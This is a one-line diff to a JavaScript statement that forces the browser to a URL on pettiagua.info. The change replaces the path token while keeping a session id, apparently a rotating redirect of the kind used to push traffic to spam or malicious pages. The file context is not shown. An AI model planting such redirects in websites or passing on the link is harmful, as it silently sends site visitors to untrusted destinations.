@@ -1,1 +1,1 @@
-window.location.href = "https://pettiagua.info/Tqb/go?sid=7744";
+window.location.href = "https://pettiagua.info/YJljL/go?sid=7744";
